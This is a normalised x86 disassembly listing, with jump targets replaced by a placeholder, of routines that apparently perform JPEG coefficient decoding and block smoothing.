mov ecx [ esp + 0x10 ]
add edx esi
mov eax [ esp + 0x8 ]
mov ecx [ ecx + edx * 4 + 0x20 ]
mov edx ebx
call [ esp + 0x3c ]
add edi [ ebx + 0x24 ]
inc esi
cmp esi [ esp + 0x28 ]
jl r-xdata
sub_493024
push ebx
push esi
push edi
add esp 0xffffffc8
xor ecx ecx
mov [ esp ] eax
mov eax [ esp ]
lea esi [ esp + 0x28 ]
mov edx [ eax + 0x1ac ]
mov [ esp + 0x4 ] edx
mov [ esp + 0xc ] ecx
mov eax [ esp ]
lea ebx [ eax + 0x14c ]
jmp r-xdata
mov eax [ esp ]
mov edx [ eax + 0x148 ]
cmp edx [ esp + 0xc ]
jg r-xdata
mov eax [ ebx ]
mov [ esp + 0x18 ] eax
mov edx [ esp + 0x18 ]
mov edi [ edx + 0xc ]
push edi
push 0x1
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x20 ]
mov ecx [ eax + 0x94 ]
mov eax [ edx + 0x4 ]
imul ecx edi
mov edx [ esp + 0xc ]
mov edx [ edx + eax * 4 + 0x48 ]
mov eax [ esp + 0x8 ]
mov edi [ eax + 0x4 ]
call [ edi + 0x20 ]
mov [ esi ] eax
add esi 0x4
inc [ esp + 0xc ]
add ebx 0x4
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x18 ]
mov [ esp + 0x10 ] eax
jmp r-xdata
mov ecx [ esp + 0x4 ]
mov eax [ ecx + 0x1c ]
cmp eax [ esp + 0x10 ]
jg r-xdata
mov edx [ esp + 0x4 ]
mov ecx [ edx + 0x14 ]
mov [ esp + 0x8 ] ecx
jmp r-xdata
mov edx [ esp ]
inc [ edx + 0x94 ]
mov ecx [ edx + 0x94 ]
mov eax [ esp ]
cmp ecx [ eax + 0x140 ]
jae r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x15c ]
cmp ecx [ esp + 0x8 ]
ja r-xdata
mov eax [ esp ]
mov edx [ eax + 0x1b4 ]
call [ edx + 0xc ]
mov eax 0x4
mov eax [ esp ]
call sub_492d48
mov eax 0x3
jmp r-xdata
xor ebx ebx
xor eax eax
mov [ esp + 0xc ] eax
lea edx [ esp + 0x28 ]
mov [ esp + 0x24 ] edx
mov ecx [ esp ]
lea eax [ ecx + 0x14c ]
mov [ esp + 0x1c ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
xor edx edx
mov [ eax + 0x14 ] edx
inc [ esp + 0x10 ]
add esp 0x38
pop edi
pop esi
pop ebx
retn
mov edx [ esp ]
mov ecx [ edx + 0x148 ]
cmp ecx [ esp + 0xc ]
jg r-xdata
mov edx [ esp + 0x1c ]
mov ecx [ edx ]
mov [ esp + 0x18 ] ecx
mov eax [ esp + 0x18 ]
mov edx [ eax + 0x34 ]
imul edx [ esp + 0x8 ]
mov [ esp + 0x14 ] edx
xor esi esi
mov eax [ esp + 0x24 ]
mov edx eax
mov [ esp + 0x20 ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add edx 0x20
mov ecx [ eax + 0x1bc ]
call [ ecx + 0x4 ]
test eax eax
jne r-xdata
mov eax [ esp + 0x18 ]
cmp esi [ eax + 0x38 ]
jl r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x10 ]
mov [ eax + 0x18 ] edx
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x8 ]
mov [ ecx + 0x14 ] eax
xor eax eax
jmp r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x10 ]
add ecx esi
mov edx [ eax ]
mov eax [ esp + 0x14 ]
shl eax 0x7
mov edx [ edx + ecx * 4 ]
add edx eax
mov eax [ esp + 0x4 ]
xor ecx ecx
lea eax [ eax + ebx * 4 + 0x20 ]
jmp r-xdata
inc [ esp + 0xc ]
add [ esp + 0x24 ] 0x4
add [ esp + 0x1c ] 0x4
mov edi [ esp + 0x18 ]
cmp ecx [ edi + 0x34 ]
jl r-xdata
mov [ eax ] edx
add edx 0x80
inc ebx
add eax 0x4
inc ecx
inc esi
sub_493214
push ebx
push esi
push edi
add esp 0xffffffd4
mov edi edx
mov [ esp ] eax
mov eax [ esp ]
mov esi [ eax + 0x1ac ]
mov eax [ esp ]
mov edx [ eax + 0x140 ]
dec edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x90 ]
cmp ecx [ eax + 0x98 ]
jl r-xdata
mov eax [ esp ]
mov edx [ eax + 0x1b4 ]
call [ edx ]
test eax eax
jne r-xdata
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x90 ]
cmp ecx [ eax + 0x98 ]
jne r-xdata
xor eax eax
jmp r-xdata
xor edx edx
mov eax edi
mov [ esp + 0xc ] edx
lea edx [ esi + 0x48 ]
mov ecx [ esp ]
mov ebx [ ecx + 0xd8 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x20 ] edx
jmp r-xdata
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x94 ]
cmp ecx [ eax + 0x9c ]
jbe r-xdata
add esp 0x2c
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov eax [ ecx + 0x24 ]
cmp eax [ esp + 0xc ]
jg r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx [ esp ]
inc [ edx + 0x9c ]
mov ecx [ edx + 0x9c ]
mov eax [ esp ]
cmp ecx [ eax + 0x140 ]
jae r-xdata
add [ esp + 0x20 ] 0x4
add [ esp + 0x24 ] 0x4
inc [ esp + 0xc ]
add ebx 0x54
mov eax [ ebx + 0xc ]
push eax
push 0x0
mov edx [ esp + 0x8 ]
mov ecx [ edx + 0x9c ]
imul ecx eax
mov eax [ esp + 0x28 ]
mov edx [ eax ]
mov eax [ esp + 0x8 ]
mov esi [ eax + 0x4 ]
call [ esi + 0x20 ]
mov ecx eax
mov eax [ esp ]
mov edx [ eax + 0x9c ]
cmp edx [ esp + 0x4 ]
jae r-xdata
mov eax 0x4
mov eax 0x3
jmp r-xdata
mov eax [ ebx + 0x20 ]
mov esi [ ebx + 0xc ]
xor edx edx
div esi
mov [ esp + 0x14 ] edx
cmp [ esp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ esp + 0x14 ] eax
jmp r-xdata
mov eax [ esp ]
mov eax [ eax + 0x1c0 ]
mov edx [ esp + 0xc ]
mov eax [ eax + edx * 4 + 0x4 ]
mov [ esp + 0x1c ] eax
mov edx [ esp + 0x24 ]
mov eax [ edx ]
mov [ esp + 0x18 ] eax
xor edx edx
mov [ esp + 0x10 ] edx
mov [ esp + 0x28 ] ecx
mov eax [ esp + 0x10 ]
cmp eax [ esp + 0x14 ]
jge r-xdata
mov [ esp + 0x14 ] esi
mov edx [ esp + 0x28 ]
xor edi edi
xor eax eax
mov esi [ edx ]
mov [ esp + 0x8 ] eax
jmp r-xdata
mov ecx [ esp + 0x8 ]
cmp ecx [ ebx + 0x1c ]
jb r-xdata
mov edx [ esp + 0x18 ]
mov ecx esi
push edx
push edi
mov eax [ esp + 0x8 ]
mov edx ebx
call [ esp + 0x24 ]
add esi 0x80
add edi [ ebx + 0x24 ]
inc [ esp + 0x8 ]
mov eax [ ebx + 0x24 ]
shl eax 0x2
add [ esp + 0x18 ] eax
inc [ esp + 0x10 ]
add [ esp + 0x28 ] 0x4
mov edx [ esp + 0x10 ]
cmp edx [ esp + 0x14 ]
jl r-xdata
sub_4933e4
push ebx
push esi
push edi
add esp 0xfffffff4
mov [ esp ] eax
mov eax [ esp ]
mov ebx [ eax + 0x1ac ]
xor eax eax
mov [ esp + 0x4 ] eax
mov edx [ esp ]
cmp [ edx + 0xdc ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ esp ]
cmp [ ecx + 0xa0 ] 0x0
jne r-xdata
add esp 0xc
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x70 ] 0x0
jne r-xdata
mov eax [ esp ]
mov esi [ ebx + 0x70 ]
xor ebx ebx
mov edx [ eax + 0xd8 ]
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x24 ]
mov esi [ eax + 0x4 ]
shl ecx 0x3
mov edx 0x1
lea ecx [ ecx + ecx * 2 ]
call [ esi ]
mov [ ebx + 0x70 ] eax
mov eax [ esp ]
cmp ebx [ eax + 0x24 ]
jl r-xdata
mov ecx [ esp + 0x8 ]
mov eax [ ecx + 0x4c ]
test eax eax
jne r-xdata
mov eax [ esp + 0x4 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0x2 ] 0x0
je r-xdata
cmp [ eax + 0x10 ] 0x0
je r-xdata
cmp [ eax + 0x20 ] 0x0
je r-xdata
cmp [ eax + 0x12 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov edx [ esp ]
mov eax [ edx + 0xa0 ]
mov edx ebx
shl edx 0x8
add eax edx
cmp [ eax ] 0x0
jge r-xdata
mov ecx 0x1
lea edx [ esi + 0x4 ]
add eax 0x4
xor eax eax
jmp r-xdata
inc ecx
add edx 0x4
add eax 0x4
cmp ecx 0x5
jle r-xdata
mov [ esp + 0x4 ] 0x1
mov edi [ eax ]
mov [ edx ] edi
cmp [ eax ] 0x0
je r-xdata
add esi 0x18
inc ebx
add [ esp + 0x8 ] 0x54
sub_4934f4
push ebx
push esi
add esp 0xfffffee8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
mov eax [ esp ]
mov edx [ eax + 0x1ac ]
mov [ esp + 0x8 ] edx
mov ecx [ esp ]
mov eax [ ecx + 0x140 ]
dec eax
mov [ esp + 0xc ] eax
jmp r-xdata
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x98 ]
cmp ecx [ eax + 0x90 ]
jl r-xdata
xor eax eax
mov [ esp + 0x18 ] eax
mov edx [ esp ]
mov ecx [ edx + 0xd8 ]
mov [ esp + 0x40 ] ecx
jmp r-xdata
mov edx [ esp ]
mov ecx [ edx + 0x1b4 ]
cmp [ ecx + 0x14 ] 0x0
je r-xdata
mov eax [ esp ]
mov edx [ eax + 0x24 ]
cmp edx [ esp + 0x18 ]
jg r-xdata
mov edx [ esp ]
mov eax [ esp ]
mov ecx [ edx + 0x98 ]
cmp ecx [ eax + 0x90 ]
jne r-xdata
mov eax [ esp + 0x40 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov ecx [ esp ]
inc [ ecx + 0x9c ]
mov eax [ ecx + 0x9c ]
mov edx [ esp ]
cmp eax [ edx + 0x140 ]
jae r-xdata
mov eax [ esp ]
mov edx [ eax + 0x1b4 ]
call [ edx ]
test eax eax
jne r-xdata
mov edx [ esp ]
cmp [ edx + 0x190 ] 0x0
jne r-xdata
inc [ esp + 0x18 ]
add [ esp + 0x40 ] 0x54
mov edx [ esp ]
mov ecx [ edx + 0x9c ]
cmp ecx [ esp + 0xc ]
jae r-xdata
mov eax 0x4
mov eax 0x3
jmp r-xdata
xor eax eax
jmp r-xdata
xor ecx ecx
mov ecx 0x1
jmp r-xdata
mov edx [ esp + 0x40 ]
mov eax [ edx + 0x20 ]
mov edx [ esp + 0x40 ]
mov ecx [ edx + 0xc ]
xor edx edx
div ecx
mov [ esp + 0x20 ] edx
cmp [ esp + 0x20 ] 0x0
jne r-xdata
mov eax [ esp + 0x40 ]
mov edx [ eax + 0xc ]
mov [ esp + 0x20 ] edx
mov ecx [ esp + 0x20 ]
add ecx ecx
mov [ esp + 0x24 ] ecx
xor eax eax
mov [ esp + 0x4c ] eax
jmp r-xdata
add esp 0x118
pop esi
pop ebx
retn
mov [ esp + 0x90 ] ecx
mov eax [ esp ]
mov edx [ eax + 0x94 ]
mov eax [ esp ]
mov ecx [ eax + 0x9c ]
add ecx [ esp + 0x90 ]
cmp edx ecx
ja r-xdata
mov edx [ esp + 0x20 ]
mov [ esp + 0x24 ] edx
mov [ esp + 0x4c ] 0x1
mov eax [ esp + 0x40 ]
mov eax [ eax + 0xc ]
mov [ esp + 0x20 ] eax
mov ecx [ esp ]
cmp [ ecx + 0x9c ] 0x0
jbe r-xdata
mov eax [ esp + 0x24 ]
push eax
push 0x0
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x10 ]
mov ebx [ eax + 0x4 ]
mov edx [ edx + ecx * 4 + 0x48 ]
xor ecx ecx
call [ ebx + 0x20 ]
mov [ esp + 0x28 ] eax
mov [ esp + 0x48 ] 0x1
mov eax [ esp + 0x40 ]
mov edx [ eax + 0xc ]
add [ esp + 0x24 ] edx
mov ecx [ esp + 0x24 ]
push ecx
push 0x0
mov eax [ esp + 0x8 ]
mov edx [ esp + 0x48 ]
mov ecx [ eax + 0x9c ]
mov eax [ esp + 0x10 ]
dec ecx
imul ecx [ edx + 0xc ]
mov edx [ esp + 0x20 ]
mov edx [ eax + edx * 4 + 0x48 ]
mov eax [ esp + 0x8 ]
mov ebx [ eax + 0x4 ]
call [ ebx + 0x20 ]
mov [ esp + 0x28 ] eax
mov eax [ esp + 0x40 ]
mov edx [ eax + 0xc ]
shl edx 0x2
add [ esp + 0x28 ] edx
xor ecx ecx
mov [ esp + 0x48 ] ecx
jmp r-xdata
mov edx [ esp + 0x94 ]
mov ecx [ edx ]
mov [ esp + 0x2c ] ecx
cmp [ esp + 0x48 ] 0x0
je r-xdata
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x8 ]
shl ecx 0x3
mov edx [ eax + 0x70 ]
lea ecx [ ecx + ecx * 2 ]
add edx ecx
mov [ esp + 0x50 ] edx
mov eax [ esp + 0x40 ]
mov edx [ eax + 0x4c ]
mov [ esp + 0x54 ] edx
mov ecx [ esp + 0x54 ]
movzx eax [ ecx ]
mov [ esp + 0x58 ] eax
mov edx [ esp + 0x54 ]
movzx ecx [ edx + 0x2 ]
mov [ esp + 0x5c ] ecx
mov eax [ esp + 0x54 ]
movzx edx [ eax + 0x10 ]
mov [ esp + 0x64 ] edx
mov ecx [ esp + 0x54 ]
movzx eax [ ecx + 0x20 ]
mov [ esp + 0x6c ] eax
mov edx [ esp + 0x54 ]
movzx ecx [ edx + 0x12 ]
mov [ esp + 0x68 ] ecx
mov eax [ esp + 0x54 ]
movzx edx [ eax + 0x4 ]
mov [ esp + 0x60 ] edx
mov ecx [ esp ]
mov edx [ esp + 0x18 ]
mov eax [ ecx + 0x1c0 ]
mov ecx [ eax + edx * 4 + 0x4 ]
mov [ esp + 0x44 ] ecx
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x18 ]
mov ecx [ eax + edx * 4 ]
xor eax eax
mov [ esp + 0x38 ] ecx
mov [ esp + 0x1c ] eax
mov edx [ esp + 0x28 ]
mov ecx edx
mov [ esp + 0x94 ] ecx
mov eax [ esp + 0x1c ]
cmp eax [ esp + 0x20 ]
jge r-xdata
mov edx [ esp + 0x94 ]
mov ecx [ edx - 0x4 ]
mov [ esp + 0x30 ] ecx
cmp [ esp + 0x1c ] 0x0
jne r-xdata
mov ecx [ esp + 0x94 ]
mov eax [ ecx + 0x4 ]
mov [ esp + 0x34 ] eax
mov eax [ esp + 0x20 ]
dec eax
cmp eax [ esp + 0x1c ]
jne r-xdata
mov eax [ esp + 0x2c ]
mov [ esp + 0x30 ] eax
jmp r-xdata
mov eax [ esp + 0x40 ]
mov edx [ eax + 0x24 ]
shl edx 0x2
add [ esp + 0x38 ] edx
inc [ esp + 0x1c ]
add [ esp + 0x94 ] 0x4
mov ecx [ esp + 0x1c ]
cmp ecx [ esp + 0x20 ]
jl r-xdata
lea edx [ esp + 0x98 ]
mov ecx 0x1
mov eax [ esp + 0x2c ]
call sub_4977bc
mov eax [ esp + 0x10 ]
cmp eax [ esp + 0x14 ]
jae r-xdata
mov edx [ esp + 0x2c ]
mov [ esp + 0x34 ] edx
jmp r-xdata
cmp [ esp + 0x4c ] 0x0
je r-xdata
mov edx [ esp + 0x50 ]
mov ebx [ edx + 0x4 ]
test ebx ebx
je r-xdata
mov edx [ esp + 0x30 ]
movsx ecx [ edx + 0x80 ]
mov [ esp + 0x78 ] ecx
mov eax [ esp + 0x2c ]
movsx edx [ eax + 0x80 ]
mov [ esp + 0x80 ] edx
mov ecx [ esp + 0x34 ]
movsx eax [ ecx + 0x80 ]
mov [ esp + 0x8c ] eax
mov edx [ esp + 0x30 ]
movsx ecx [ edx ]
mov [ esp + 0x78 ] ecx
mov [ esp + 0x74 ] ecx
mov [ esp + 0x70 ] ecx
mov eax [ esp + 0x2c ]
movsx edx [ eax ]
mov [ esp + 0x80 ] edx
mov [ esp + 0x7c ] edx
mov eax [ esp + 0x34 ]
mov esi edx
movsx edx [ eax ]
mov [ esp + 0x8c ] edx
mov [ esp + 0x88 ] edx
mov [ esp + 0x84 ] edx
xor eax eax
mov [ esp + 0x3c ] eax
xor edx edx
mov ecx [ esp + 0x40 ]
mov eax [ ecx + 0x1c ]
dec eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
mov ecx [ esp + 0x10 ]
cmp ecx [ esp + 0x14 ]
ja r-xdata
mov edx [ esp + 0x50 ]
mov ebx [ edx + 0x8 ]
test ebx ebx
je r-xdata
cmp [ esp + 0x9a ] 0x0
jne r-xdata
mov edx [ esp + 0x50 ]
mov ebx [ edx + 0xc ]
test ebx ebx
je r-xdata
cmp [ esp + 0xa8 ] 0x0
jne r-xdata
mov ecx esi
sub ecx [ esp + 0x80 ]
imul ecx [ esp + 0x58 ]
shl ecx 0x2
lea ecx [ ecx + ecx * 8 ]
test ecx ecx
jl r-xdata
mov edx [ esp + 0x50 ]
mov ebx [ edx + 0x10 ]
test ebx ebx
je r-xdata
cmp [ esp + 0xb8 ] 0x0
jne r-xdata
mov eax [ esp + 0x74 ]
sub eax [ esp + 0x88 ]
imul [ esp + 0x58 ]
mov ecx eax
shl ecx 0x2
lea ecx [ ecx + ecx * 8 ]
test ecx ecx
jl r-xdata
mov eax [ esp + 0x5c ]
mov edx [ esp + 0x5c ]
shl eax 0x7
shl edx 0x8
sub eax ecx
mov ecx edx
cdq
idiv ecx
test ebx ebx
jle r-xdata
mov eax [ esp + 0x5c ]
mov edx [ esp + 0x5c ]
shl eax 0x7
shl edx 0x8
add eax ecx
mov ecx edx
cdq
idiv ecx
test ebx ebx
jle r-xdata
mov edx [ esp + 0x50 ]
mov ebx [ edx + 0x14 ]
test ebx ebx
je r-xdata
cmp [ esp + 0xaa ] 0x0
jne r-xdata
mov eax [ esp + 0x74 ]
mov edx [ esp + 0x7c ]
add eax [ esp + 0x88 ]
add edx edx
sub eax edx
imul [ esp + 0x58 ]
lea ecx [ eax + eax * 8 ]
test ecx ecx
jl r-xdata
mov eax [ esp + 0x64 ]
mov edx [ esp + 0x64 ]
shl eax 0x7
shl edx 0x8
sub eax ecx
mov ecx edx
cdq
idiv ecx
test ebx ebx
jle r-xdata
mov eax [ esp + 0x64 ]
mov edx [ esp + 0x64 ]
shl eax 0x7
shl edx 0x8
add eax ecx
mov ecx edx
cdq
idiv ecx
test ebx ebx
jle r-xdata
neg eax
mov ecx ebx
mov edx 0x1
shl edx cl
cmp eax edx
jl r-xdata
mov [ esp + 0x9a ] ax
mov ecx ebx
mov edx 0x1
shl edx cl
cmp eax edx
jl r-xdata
mov edx [ esp + 0x38 ]
push edx
mov eax [ esp + 0x40 ]
push eax
lea ecx [ esp + 0xa0 ]
mov edx [ esp + 0x48 ]
mov eax [ esp + 0x8 ]
call [ esp + 0x4c ]
mov edx [ esp + 0x74 ]
mov [ esp + 0x70 ] edx
mov ecx [ esp + 0x78 ]
mov [ esp + 0x74 ] ecx
mov esi [ esp + 0x7c ]
mov eax [ esp + 0x80 ]
mov [ esp + 0x7c ] eax
mov edx [ esp + 0x88 ]
mov [ esp + 0x84 ] edx
mov ecx [ esp + 0x8c ]
mov [ esp + 0x88 ] ecx
add [ esp + 0x2c ] 0x80
add [ esp + 0x30 ] 0x80
add [ esp + 0x34 ] 0x80
mov eax [ esp + 0x40 ]
mov edx [ eax + 0x24 ]
add [ esp + 0x3c ] edx
inc [ esp + 0x10 ]
mov ecx [ esp + 0x10 ]
cmp ecx [ esp + 0x14 ]
jbe r-xdata
cmp [ esp + 0x9c ] 0x0
jne r-xdata
mov eax [ esp + 0x70 ]
sub eax [ esp + 0x78 ]
sub eax [ esp + 0x84 ]
add eax [ esp + 0x8c ]
imul [ esp + 0x58 ]
lea ecx [ eax + eax * 4 ]
test ecx ecx
jl r-xdata
mov eax [ esp + 0x6c ]
mov edx [ esp + 0x6c ]
shl eax 0x7
shl edx 0x8
sub eax ecx
mov ecx edx
cdq
idiv ecx
test ebx ebx
jle r-xdata
mov eax [ esp + 0x6c ]
mov edx [ esp + 0x6c ]
shl eax 0x7
shl edx 0x8
add eax ecx
mov ecx edx
cdq
idiv ecx
test ebx ebx
jle r-xdata
neg eax
mov ecx ebx
mov edx 0x1
shl edx cl
cmp eax edx
jl r-xdata
mov [ esp + 0xa8 ] ax
mov ecx ebx
mov edx 0x1
shl edx cl
cmp eax edx
jl r-xdata
mov ecx ebx
mov eax 0x1
shl eax cl
dec eax
mov ecx ebx
mov eax 0x1
shl eax cl
dec eax
jmp r-xdata
add esi [ esp + 0x80 ]
mov eax [ esp + 0x7c ]
add eax eax
sub esi eax
imul esi [ esp + 0x58 ]
lea ecx [ esi + esi * 8 ]
test ecx ecx
jl r-xdata
mov eax [ esp + 0x68 ]
mov edx [ esp + 0x68 ]
shl eax 0x7
shl edx 0x8
sub eax ecx
mov ecx edx
cdq
idiv ecx
test ebx ebx
jle r-xdata
mov eax [ esp + 0x68 ]
mov edx [ esp + 0x68 ]
shl eax 0x7
shl edx 0x8
add eax ecx
mov ecx edx
cdq
idiv ecx
test ebx ebx
jle r-xdata
neg eax
mov ecx ebx
mov edx 0x1
shl edx cl
cmp eax edx
jl r-xdata
mov [ esp + 0xb8 ] ax
mov ecx ebx
mov edx 0x1
shl edx cl
cmp eax edx
jl r-xdata
mov ecx ebx
mov eax 0x1
shl eax cl
dec eax
mov ecx ebx
mov eax 0x1
shl eax cl
dec eax
jmp r-xdata
mov eax [ esp + 0x60 ]
mov edx [ esp + 0x60 ]
shl eax 0x7
shl edx 0x8
sub eax ecx
mov ecx edx
cdq
idiv ecx
test ebx ebx
jle r-xdata
mov eax [ esp + 0x60 ]
mov edx [ esp + 0x60 ]
shl eax 0x7
shl edx 0x8
add eax ecx
mov ecx edx
cdq
idiv ecx
test ebx ebx
jle r-xdata
neg eax
mov ecx ebx
mov edx 0x1
shl edx cl
cmp eax edx
jl r-xdata
mov [ esp + 0xaa ] ax
mov ecx ebx
mov edx 0x1
shl edx cl
cmp eax edx
jl r-xdata
mov ecx ebx
mov eax 0x1
shl eax cl
dec eax
mov ecx ebx
mov eax 0x1
shl eax cl
dec eax
jmp r-xdata
neg eax
mov ecx ebx
mov edx 0x1
shl edx cl
cmp eax edx
jl r-xdata
mov [ esp + 0x9c ] ax
mov ecx ebx
mov edx 0x1
shl edx cl
cmp eax edx
jl r-xdata
mov ecx ebx
mov eax 0x1
shl eax cl
dec eax
mov ecx ebx
mov eax 0x1
shl eax cl
dec eax
jmp r-xdata
mov ecx ebx
mov eax 0x1
shl eax cl
dec eax
mov ecx ebx
mov eax 0x1
shl eax cl
dec eax
jmp r-xdata
sub_493cc4
push ebx
push esi
push edi
mov edi eax
mov eax edi
push ebp
mov ebx edx
mov edx 0x1
mov esi [ eax + 0x4 ]
add esp 0xfffffff4
mov ecx 0x74
call [ esi ]
mov esi eax
xor eax eax
mov [ edi + 0x1ac ] esi
test ebx ebx
mov [ esi ] sub_492d94
mov [ esi + 0x8 ] sub_492da4
mov [ esi + 0x70 ] eax
je r-xdata
mov eax edi
mov ecx 0x500
mov edx 0x1
mov ebx [ eax + 0x4 ]
call [ ebx + 0x4 ]
mov ecx eax
xor eax eax
lea edx [ esi + 0x20 ]
xor edx edx
mov [ esp ] edx
mov ebx [ edi + 0xd8 ]
lea eax [ esi + 0x48 ]
mov [ esp + 0x8 ] eax
jmp r-xdata
mov ebx eax
inc eax
shl ebx 0x7
add ebx ecx
mov [ edx ] ebx
add edx 0x4
cmp eax 0xa
jl r-xdata
mov [ esi + 0x4 ] sub_493020
mov [ esi + 0xc ] sub_492de0
xor eax eax
mov [ esi + 0x10 ] eax
mov eax [ edi + 0x24 ]
cmp eax [ esp ]
jg r-xdata
mov edx [ ebx + 0xc ]
mov [ esp + 0x4 ] edx
cmp [ edi + 0xdc ] 0x0
je r-xdata
mov [ esi + 0x4 ] sub_493024
mov [ esi + 0xc ] sub_493214
lea ecx [ esi + 0x48 ]
mov [ esi + 0x10 ] ecx
jmp r-xdata
mov edx [ ebx + 0x8 ]
mov eax [ ebx + 0x1c ]
call sub_497758
push eax
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x20 ]
call sub_497758
push eax
mov eax edi
mov ecx [ esp + 0xc ]
mov edx 0x1
push ecx
mov ecx 0x1
mov ebp [ eax + 0x4 ]
call [ ebp + 0x14 ]
mov edx [ esp + 0x8 ]
mov [ edx ] eax
add [ esp + 0x8 ] 0x4
inc [ esp ]
add ebx 0x54
mov ecx [ esp + 0x4 ]
lea ecx [ ecx + ecx * 2 ]
mov [ esp + 0x4 ] ecx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
sub_493dd8
push ebx
push esi
mov esi eax
sub edx 0x1
mov ebx [ esi + 0x1b0 ]
jb r-xdata
cmp [ esi + 0x54 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ esi + 0x1c4 ]
mov edx [ eax + 0x4 ]
mov [ ebx + 0x4 ] edx
jmp r-xdata
mov [ ebx + 0x4 ] sub_493e80
cmp [ ebx + 0xc ] 0x0
jne r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
dec edx
je r-xdata
xor ecx ecx
mov [ ebx + 0x18 ] ecx
mov [ ebx + 0x14 ] ecx
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
xor ecx ecx
push eax
mov eax esi
push 0x1
mov esi [ eax + 0x4 ]
mov edx [ ebx + 0x8 ]
call [ esi + 0x1c ]
mov [ ebx + 0xc ] eax
jmp r-xdata
mov [ ebx + 0x4 ] sub_493fa0
jmp r-xdata
mov ecx [ esi ]
mov eax esi
mov [ ecx + 0x14 ] 0x4
mov edx [ eax ]
call [ edx ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
jmp r-xdata
mov [ ebx + 0x4 ] sub_493efc
jmp r-xdata
mov ecx [ esi ]
mov eax esi
mov [ ecx + 0x14 ] 0x4
mov edx [ eax ]
call [ edx ]
mov ecx [ esi ]
mov eax esi
mov [ ecx + 0x14 ] 0x4
mov edx [ eax ]
call [ edx ]
sub_493e80
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x1b0 ]
mov eax [ ebp + 0xc ]
push [ eax ]
mov eax [ ebp + 0x8 ]
pop ecx
sub eax ecx
mov ecx [ ebx + 0x10 ]
cmp eax ecx
jbe r-xdata
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ecx [ ebp + 0x14 ]
push ecx
mov ecx [ ebx + 0xc ]
push ecx
lea ecx [ ebp - 0xc ]
push ecx
push eax
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x1c4 ]
call [ esi + 0x4 ]
mov eax [ ebp - 0xc ]
push eax
mov edx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
mov ecx [ edx ]
mov edx [ ebx + 0xc ]
shl ecx 0x2
mov ebx [ eax + 0x1cc ]
add ecx [ ebp + 0x10 ]
call [ ebx + 0x4 ]
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax ecx
sub_493efc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx [ esi + 0x1b0 ]
cmp [ ebx + 0x18 ] 0x0
jne r-xdata
mov eax [ ebx + 0x18 ]
mov [ ebp - 0xc ] eax
lea eax [ ebx + 0x18 ]
mov edx [ ebp + 0x14 ]
push edx
mov ecx [ ebx + 0xc ]
push ecx
push eax
mov eax esi
mov edx [ ebx + 0x10 ]
push edx
mov edi [ eax + 0x1c4 ]
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
call [ edi + 0x4 ]
mov eax [ ebx + 0x18 ]
cmp eax [ ebp - 0xc ]
jbe r-xdata
mov eax [ ebx + 0x10 ]
push eax
mov eax esi
push 0x1
mov edi [ eax + 0x4 ]
mov ecx [ ebx + 0x14 ]
mov edx [ ebx + 0x8 ]
call [ edi + 0x1c ]
mov [ ebx + 0xc ] eax
mov eax [ ebx + 0x10 ]
cmp eax [ ebx + 0x18 ]
ja r-xdata
sub eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax esi
mov edx [ ebp - 0x10 ]
push edx
mov edx [ ebp - 0xc ]
mov esi [ eax + 0x1cc ]
shl edx 0x2
add edx [ ebx + 0xc ]
xor ecx ecx
call [ esi + 0x4 ]
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
add [ ebx + 0x14 ] eax
xor edx edx
mov [ ebx + 0x18 ] edx
sub_493fa0
push ebp
mov ebp esp
